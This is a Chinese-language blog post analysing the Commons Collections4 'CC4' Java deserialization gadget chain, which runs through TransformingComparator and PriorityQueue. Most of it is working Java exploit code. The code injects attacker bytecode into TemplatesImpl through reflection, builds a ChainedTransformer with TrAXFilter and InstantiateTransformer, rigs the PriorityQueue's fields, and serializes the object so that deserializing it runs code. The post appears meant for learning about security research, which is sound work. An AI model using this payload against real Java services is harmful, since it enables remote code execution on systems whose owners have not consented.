---
layout: post
date: 2025-4-18
title: "CommonsCollections-CC4-分析"
author: "XinYiSleep"
category: Java
---
<h1 id="n2cgu">一.基础信息</h1>

```java
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-collections4</artifactId>
    <version>4.0</version>
</dependency>

JDK1.8.*
```
<h1 id="aUp8M">二.再次寻找transform</h1>

```
在我们学习cc3或cc1的时候其实我们知道用到LazyMap.decorate静态方法，执行构造方法修改factory形成闭环，但是呢在commons-collections4中并没有decorate这个静态方法导致无法执行构造方法那就更别想着控制factory了，不过这里的构造方法在commons-collections4中中是public所以只要改一下依然可以执行cc3的结合(图一,图二)，看下面代码(代码一)，上面都是题外话了，主要讲一下cc4我们链子比如断在这块了，下面就去找transform，在TransformingComparator.compare中找到了(图三)，transformer熟悉是一个泛型，刚好ChainedTransformer类就实现Transformer接口(图四)，下面就去找compare，好那我们先模拟运行一下(代码二)。

```
```java
TemplatesImpl templates = new TemplatesImpl();
Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
Field name = templatesClass.getDeclaredField("_name");
name.setAccessible(true);
name.set(templates,"123");

Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
bytecodes.setAccessible(true);
byte[] bytes = Files.readAllBytes(Paths.get("D:\\phpStudy\\test.class"));
bytecodes.set(templates,new byte[][]{bytes});


Field tfactory = templatesClass.getDeclaredField("_tfactory");
tfactory.setAccessible(true);
tfactory.set(templates,new TransformerFactoryImpl());
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})

};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
HashMap<Object, Object> o = new HashMap<>();
Map decorate = LazyMap.lazyMap(o, chainedTransformer);
TiedMapEntry tiedMapEntry = new TiedMapEntry(o, "123");
HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
objectObjectHashMap.put(tiedMapEntry, "456");
Class<?> aClass = Class.forName("org.apache.commons.collections4.keyvalue.TiedMapEntry");
Field map = aClass.getDeclaredField("map");
map.setAccessible(true);
map.set(tiedMapEntry,decorate);
serialize(objectObjectHashMap);
unserialize("ser.bin");
```
```java
TemplatesImpl templates = new TemplatesImpl();
Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
Field name = templatesClass.getDeclaredField("_name");
name.setAccessible(true);
name.set(templates,"123");

Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
bytecodes.setAccessible(true);
byte[] bytes = Files.readAllBytes(Paths.get("D:\\phpStudy\\test.class"));
bytecodes.set(templates,new byte[][]{bytes});


Field tfactory = templatesClass.getDeclaredField("_tfactory");
tfactory.setAccessible(true);
tfactory.set(templates,new TransformerFactoryImpl());
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})

};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer);
transformingComparator.compare(1,2);
```

![](https://xinyisleep.github.io/img/2025/commons-collections4/1.png)

![](https://xinyisleep.github.io/img/2025/commons-collections4/2.png)

![](https://xinyisleep.github.io/img/2025/commons-collections4/3.png)

![](https://xinyisleep.github.io/img/2025/commons-collections4/4.png)

<h1 id="wM2Ad">三.链</h1>

```
模拟运行之后其实还是很简单的，其实cc4都很简单基本上变的地方不多，下面就去找compare，在PriorityQueue.siftDownUsingComparator中调用了，
其实下面的操作都是在这个类中完成了包括入口方法readObject(图一,图二,图三,图四),那我们就直接执行呗，但是先得解决几个问题，问题一图三中需要进入这个循环，
默认肯定是进不去的代码逻辑都不需要看，因为size是空，在正版中通过add这个方法添加逻辑看(图五,图六)，这里我直接用反射修改，问题二comparator不能是null而且必须是TransformingComparator看(图二，图一)，
依旧反射修改这里不得不佩服作者也不知道怎么找的反正都刚好对上了，为什么这么说呢 因为comparator熟悉也是一个泛型(图七)，刚好Transforming
Comparator实现了comparator接口(图八)，最终exp(代码一)。

```

![](https://xinyisleep.github.io/img/2025/commons-collections4/5.png)

![](https://xinyisleep.github.io/img/2025/commons-collections4/6.png)

![](https://xinyisleep.github.io/img/2025/commons-collections4/7.png)

![](https://xinyisleep.github.io/img/2025/commons-collections4/8.png)

![](https://xinyisleep.github.io/img/2025/commons-collections4/9.png)

![](https://xinyisleep.github.io/img/2025/commons-collections4/10.png)

![](https://xinyisleep.github.io/img/2025/commons-collections4/11.png)

![](https://xinyisleep.github.io/img/2025/commons-collections4/12.png)

```java
package com.example.cc4;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.BooleanComparator;
import org.apache.commons.collections4.comparators.ComparableComparator;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;

@SpringBootApplication
public class Cc3Application {

    public static void main(String[] args) throws Exception {



        TemplatesImpl templates = new TemplatesImpl();
        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"123");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] bytes = Files.readAllBytes(Paths.get("D:\\phpStudy\\test.class"));
        bytecodes.set(templates,new byte[][]{bytes});


        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer);

        PriorityQueue<Object> objects = new PriorityQueue<>();
        Class<PriorityQueue> priorityQueueClass = PriorityQueue.class;
        Field size = priorityQueueClass.getDeclaredField("size");
        size.setAccessible(true);
        size.set(objects,11);

        Field comparator = priorityQueueClass.getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(objects,transformingComparator);
        serialize(objects);
        unserialize("ser.bin");

    }
    public static void serialize(Object obj) throws Exception {
        //序列化
        ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);

    }
    public static Object unserialize(String name) throws Exception {
        //反序列化
        ObjectInputStream ois= new ObjectInputStream(new FileInputStream(name));
        Object o = ois.readObject();
        return o;
    }

}

```

